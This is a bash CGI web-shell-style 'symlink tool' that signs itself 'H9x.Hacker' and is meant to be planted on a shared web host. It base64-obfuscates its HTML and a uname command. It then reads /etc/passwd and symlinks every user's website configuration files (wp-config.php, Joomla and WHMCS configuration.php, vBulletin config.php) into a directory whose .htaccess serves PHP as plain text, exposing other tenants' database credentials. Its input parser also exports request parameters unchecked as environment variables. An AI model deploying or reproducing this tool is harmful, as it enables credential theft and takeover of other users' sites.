#!/bin/bash

# H9x.Hacker ScRipT

# (internal) routine to store POST data
function cgi_get_POST_vars()
{
    # only handle POST requests here
    [ "$REQUEST_METHOD" != "POST" ] && return

    # save POST variables (only first time this is called)
    [ ! -z "$QUERY_STRING_POST" ] && return

    # skip empty content
    [ -z "$CONTENT_LENGTH" ] && return

    # check content type
    # FIXME: not sure if we could handle uploads with this..
    [ "${CONTENT_TYPE}" != "application/x-www-form-urlencoded" ] && \
        echo "bash.cgi warning: you should probably use MIME type "\
             "application/x-www-form-urlencoded!" 1>&2

    # convert multipart to urlencoded
    local handlemultipart=0 # enable to handle multipart/form-data (dangerous?)
    if [ "$handlemultipart" = "1" -a "${CONTENT_TYPE:0:19}" = "multipart/form-data" ]; then
        boundary=${CONTENT_TYPE:30}
        read -N $CONTENT_LENGTH RECEIVED_POST
        # FIXME: don't use awk, handle binary data (Content-Type: application/octet-stream)
        QUERY_STRING_POST=$(echo "$RECEIVED_POST" | awk -v b=$boundary 'BEGIN { RS=b"\r\n"; FS="\r\n"; ORS="&" }
           $1 ~ /^Content-Disposition/ {gsub(/Content-Disposition: form-data; name=/, "", $1); gsub("\"", "", $1); print $1"="$3 }')

    # take input string as is
    else
        read -N $CONTENT_LENGTH QUERY_STRING_POST
    fi

    return
}

# (internal) routine to decode urlencoded strings
function cgi_decodevar()
{
    [ $# -ne 1 ] && return
    local v t h
    # replace all + with whitespace and append %%
    t="${1//+/ }%%"
    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
        v="${v}${t%%\%*}" # digest up to the first %
        t="${t#*%}"       # remove digested part
        # decode if there is anything to decode and if not at end of string
        if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
            h=${t:0:2} # save first two chars
            t="${t:2}" # remove these
            v="${v}"`echo -e \\\\x${h}` # convert hex to special char
        fi
    done
    # return decoded string
    echo "${v}"
    return
}

# routine to get variables from http requests
# usage: cgi_getvars method varname1 [.. varnameN]
# method is either GET or POST or BOTH
# the magic varible name ALL gets everything
function cgi_getvars()
{
    [ $# -lt 2 ] && return
    local q p k v s
    # get query
    case $1 in
        GET)
            [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
            ;;
        POST)
            cgi_get_POST_vars
            [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
            ;;
        BOTH)
            [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
            cgi_get_POST_vars
            [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
            ;;
    esac
    shift
    s=" $* "
    # parse the query data
    while [ ! -z "$q" ]; do
        p="${q%%&*}"  # get first part of query string
        k="${p%%=*}"  # get the key (variable name) from it
        v="${p#*=}"   # get the value from it
        q="${q#$p&*}" # strip first part from query string
        # decode and assign variable if requested
        [ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
            export "$k"="`cgi_decodevar \"$v\"`"
    done
    return
}

# register all GET and POST variables
cgi_getvars BOTH ALL



echo -e "Content-type: text/html\n\n"

echo 'PGh0bWw+CjxoZWFkPgo8dGl0bGU+U3lNTGluSyBUb29MPC90aXRsZT4KPC9oZWFkPgo8Ym9keSBzdHlsZT0iY29sb3I6IHdoaXRlOyBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsiIGFsaW5rPSIjMDAwMDk5IgpsaW5rPSIjMDAwMDk5IiB2bGluaz0iIzk5MDA5OSI+CjxkaXYgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPjxiaWcKc3R5bGU9ImZvbnQtZmFtaWx5OiBUaW1lcyBOZXcgUm9tYW4sVGltZXMsc2VyaWY7Ij48c3BhbgpzdHlsZT0iZm9udC13ZWlnaHQ6IGJvbGQ7Ij5TWU1MSU5LIFRPT0wgPC9zcGFuPjwvYmlnPjxicj4KPGJyPgo8ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7Ij48aW1nCnN0eWxlPSJ3aWR0aDogMTk4cHg7IGhlaWdodDogMTgwcHg7IiBhbHQ9IiIKc3JjPSJodHRwczovL2Nkbi5hdXRoMC5jb20vYmxvZy9sb2dvcy9ibGFjay1oYXQtbG9nby5wbmciPjxicj4KPGJyPgo8YnI+Cjxicj4KPHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiBib2xkOyI+PHNwYW4Kc3R5bGU9ImNvbG9yOiByZ2IoMTUzLCAxNTMsIDE1Myk7Ij5IOXguSGFja2VyPC9zcGFuPiA8c3BhbgpzdHlsZT0iY29sb3I6IHJlZDsiPnw8L3NwYW4+IDxzcGFuIHN0eWxlPSJjb2xvcjogc2lsdmVyOyI+PHNwYW4Kc3R5bGU9ImNvbG9yOiByZ2IoMTUzLCAxNTMsIDE1Myk7Ij5oeEBvdXRsb29rLmNsPC9zcGFuPiA8L3NwYW4+PHNwYW4Kc3R5bGU9ImNvbG9yOiByZWQ7Ij58PC9zcGFuPiA8c3BhbiBzdHlsZT0iY29sb3I6IHJnYigxNTMsIDE1MywgMTUzKTsiPjIwMDktMjAxOTwvc3Bhbj48L3NwYW4+PGJyPgo8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgoK' | base64 -d

echo '<br>'

echo '<div style="text-align: center;"><span
style="color: red; font-family: Linux Libertine Mono O; font-weight: bold;">uname: <small> '
eval `echo dW5hbWUgLWEK | base64 -d`;echo ' </small>

  </span><br>
</div>


'
echo ' <br></br>'


echo 'PGNlbnRlcj4KPHRhYmxlIGJvcmRlcj0wPjx0cj48dGQ+PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IAo8dGQ+Cjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgoJCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Imh4IiB2YWx1ZT0iMSIgIC8+CgkKCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidXR0b24iIG5hbWU9ImJ1dHRvbiIgdmFsdWU9IlN5bWxpbmsiIC8+Cgk8L2Zvcm0+CjwvdGQ+Cgo8L2NlbnRlcj4=' | base64 -d



if [ $hx -eq 1 ] ; then
mkdir ../sym
 echo Options Indexes FollowSymLinks > ../sym/.htaccess 
 echo  DirectoryIndex ssssss.htm >> ../sym/.htaccess 
 echo  AddType txt .php >> ../sym/.htaccess 
 echo  AddHandler txt .php >> ../sym/.htaccess 
 echo   AddType txt .html >> ../sym/.htaccess 
 echo  AddHandler txt .html >> ../sym/.htaccess 
 echo  Options all >> ../sym/.htaccess 
 echo  Options >> ../sym/.htaccess 
 echo  Options >> ../sym/.htaccess 
 echo 'ReadmeName hx.txt' >> ../sym/.htaccess
 echo 'RG9uZSBCeSBIOXguSGFja2VyCg=='| base64 -d > ../sym/hx.txt
for i in `cd /etc ;cat passwd |grep /home |cut -d":" -f1` ; do
eval "ln -s /home/$i/public_html/ ../sym/0-$i.txt" ;
eval "ln -s /home/$i/public_html/clientarea/configuration.php ../sym/$i-clientarea.txt";
eval "ln -s /home/$i/public_html/clients/configuration.php ../sym/$i-client.txt";
eval "ln -s /home/$i/public_html/configuration.php ../sym/$i-whmcsorjoomla.txt";
eval "ln -s /home/$i/public_html/billing/configuration.php ../sym/$i-billing.txt";
eval "ln -s /home/$i/public_html/billings/configuration.php ../sym/$i-billings.txt";
eval "ln -s /home/$i/public_html/whmcs/configuration.php ../sym/$i-whmcs2.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../sym/$i-whmcs3.txt";
eval "ln -s /home/$i/public_html/my/configuration.php ../sym/$i-whmcs4.txt";
eval "ln -s /home/$i/public_html/whm/configuration.php ../sym/$i-whm.txt";
eval "ln -s /home/$i/public_html/whmc/configuration.php ../sym/$i-whmc.txt";
eval "ln -s /home/$i/public_html/support/configuration.php ../sym/$i-support.txt";
eval "ln -s /home/$i/public_html/supports/configuration.php ../sym/$i-supports.txt";
eval "ln -s /home/$i/public_html/vb/includes/config.php ../sym/$i-vb.txt";
eval "ln -s /home/$i/public_html/includes/config.php ../sym/$i-vb2.txt";
eval "ln -s /home/$i/public_html/config.php ../sym/$i-2.txt";
eval "ln -s /home/$i/public_html/forum/includes/config.php ../sym/$i-forum.txt";
eval "ln -s /home/$i/public_html/forums/includes/config.php ../sym/$i-forums.txt";
eval "ln -s /home/$i/public_html/admin/conf.php ../sym/$i-5.txt";
eval "ln -s /home/$i/public_html/admin/config.php ../sym/$i-4.txt";
eval "ln -s /home/$i/public_html/wp-config.php ../sym/$i-wordpress.txt";
eval "ln -s /home/$i/public_html/blog/wp-config.php ../sym/$i-wordpress2.txt";
eval "ln -s /home/$i/public_html/conf_global.php ../sym/$i-6.txt";
eval "ln -s /home/$i/public_html/include/db.php ../sym/$i-7.txt";
eval "ln -s /home/$i/public_html/connect.php ../sym/$i-8.txt";
eval "ln -s /home/$i/public_html/mk_conf.php ../sym/$i-9.txt";
eval "ln -s /home/$i/public_html/joomla/configuration.php ../sym/$i-joomla.txt";
eval "ln -s /home/$i/public_html/web/configuration.php ../sym/$i-joomla2.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../sym/$i-joomla2.txt";
eval "ln -s /home/$i/public_html/include/config.php ../sym/$i-10.txt";
done
echo 'PC94bXA+PGRpdiBhbGlnbj0nY2VudGVyJz48YnI+IFNZTUxJTksgPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9Jy4uL3N5bSc+Q0xJQ0sgSEVSRTwvYT4gPC9kaXY+' | base64 -d
fi


# Don't Mess With My Tool nd go create ur own


